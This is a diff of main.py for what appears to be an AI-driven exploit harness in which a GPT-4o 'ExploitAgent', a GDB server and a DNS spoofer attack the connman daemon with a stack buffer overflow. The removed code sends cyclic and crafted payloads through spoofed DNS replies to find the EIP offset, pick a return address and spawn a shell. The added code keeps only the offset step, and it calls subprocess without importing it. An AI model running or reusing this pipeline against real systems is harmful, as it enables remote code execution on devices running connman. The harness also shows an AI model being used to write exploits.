@@ -1,110 +1,69 @@
 # main.py
-import subprocess
+import socket
 import time
 import json
 from dotenv import load_dotenv
 from agent import ExploitAgent
 
-# Load environment variables from .env file
 load_dotenv()
 
-TARGET_PATH = "./target/connmand"
+TARGET_HOST = 'target' # The service name from docker-compose.yml
+TARGET_PORT = 8080
 
-def run_phase(phase_name, function, *args):
-    """Helper function to run a phase and print status."""
-    print(f"--- 🚀 PHASE: {phase_name} ---")
-    result = function(*args)
-    if result:
-        print(f"--- ✅ SUCCESS: {phase_name} ---")
-        return result
-    else:
-        print(f"--- ❌ FAILED: {phase_name} ---")
-        exit(1)
+class GDBClient:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.sock = None
 
-def phase_1_find_offset(agent):
-    """Crashes the program to find the EIP offset."""
-    gdb_server = subprocess.Popen(
-        ['python3', 'gdb_mcp_server.py', TARGET_PATH],
-        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
-    )
-    time.sleep(2) # Give GDB time to start up
+    def connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Keep trying to connect until the target container is ready
+        for _ in range(10):
+            try:
+                self.sock.connect((self.host, self.port))
+                print("Connected to GDB MCP Server.")
+                return
+            except ConnectionRefusedError:
+                time.sleep(1)
+        raise ConnectionRefusedError("Could not connect to GDB server.")
 
-    # Generate a unique pattern and send it via the DNS spoofer
-    pattern = agent.generate_cyclic_pattern(1200)
-    subprocess.run(['python3', 'dns_spoofer.py', '--payload', pattern.encode().hex()])
-    
-    # Trigger connman's DNS lookup
-    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True)
-    
-    # Ask the GDB server for the crash info
-    gdb_server.stdin.write("get_crash_info\n")
-    gdb_server.stdin.flush()
-    
-    response_str = gdb_server.stdout.readline()
-    gdb_server.kill()
+    def send_command(self, method, params=None):
+        if not self.sock:
+            self.connect()
+        
+        request = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
+        self.sock.sendall(json.dumps(request).encode())
+        response_data = self.sock.recv(4096)
+        return json.loads(response_data.decode())
 
-    offset = agent.analyze_crash_and_get_offset(response_str)
-    print(f"Agent determined offset: {offset}")
-    return offset
+    def close(self):
+        if self.sock:
+            self.sock.close()
 
-def phase_2_get_shell(agent, offset):
-    """Selects a return address and injects the final payload."""
-    gdb_server = subprocess.Popen(
-        ['python3', 'gdb_mcp_server.py', TARGET_PATH],
-        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
-    )
-    time.sleep(2)
-
-    # First, get a stable ESP value by sending a simple crash payload
-    control_payload = b'A' * offset + b'B' * 4
-    subprocess.run(['python3', 'dns_spoofer.py', '--payload', control_payload.hex()])
-    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True)
-
-    gdb_server.stdin.write("get_crash_info\n")
-    gdb_server.stdin.flush()
-    response_str = gdb_server.stdout.readline()
-    
-    # Restart the process in GDB to get a clean stack for the final shot
-    gdb_server.kill()
-    gdb_server = subprocess.Popen(
-        ['python3', 'gdb_mcp_server.py', TARGET_PATH],
-        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
-    )
-    time.sleep(2)
-
-    return_address = agent.select_return_address(response_str)
-    print(f"Agent selected return address: {hex(return_address)}")
-
-    final_payload = agent.craft_final_payload(offset, return_address)
-    
-    # Send the final payload
-    subprocess.run(['python3', 'dns_spoofer.py', '--payload', final_payload.hex()])
-    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True)
-
-    # Ask GDB to continue and check if a shell was spawned
-    gdb_server.stdin.write("check_shell\n")
-    gdb_server.stdin.flush()
-    
-    response_str = gdb_server.stdout.readline()
-    gdb_server.kill()
-    
-    try:
-        response_json = json.loads(response_str)
-        if response_json.get('shell_active'):
-            print("SHELL SPAWNED! Exploit successful.")
-            return True
-    except json.JSONDecodeError:
-        print(f"Error decoding GDB response: {response_str}")
-        return False
-    return False
-
-def main():
+def run_exploit():
     agent = ExploitAgent(model_name="openai/gpt-4o")
+    gdb_client = GDBClient(TARGET_HOST, TARGET_PORT)
+    gdb_client.connect()
+
+    # --- Phase 1: Find Offset ---
+    print("--- 🚀 PHASE: Find EIP Offset ---")
+    pattern = agent.generate_cyclic_pattern(1200)
     
-    offset = run_phase("Find EIP Offset", phase_1_find_offset, agent)
-    run_phase("Get Shell", phase_2_get_shell, agent, offset)
+    # Use the DNS spoofer to send the payload
+    subprocess.run(['python3', 'dns_spoofer.py', '--payload', pattern.encode().hex()])
+    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True, check=False)
     
-    print("\n🎉 Exploit sequence complete.")
+    # Tell GDB to run and get the crash info
+    crash_info = gdb_client.send_command('run_and_wait_for_crash')
+    offset = agent.analyze_crash_and_get_offset(json.dumps(crash_info))
+    print(f"Agent determined offset: {offset}")
+    print("--- ✅ SUCCESS: Find EIP Offset ---")
+    
+    # In a real loop, you would now close the client, restart the containers,
+    # and run the next phase. For simplicity, we stop here.
+    print("\n🎉 Minimal exploit sequence complete. Offset found.")
+    gdb_client.close()
 
 if __name__ == "__main__":
-    main()
+    run_exploit()
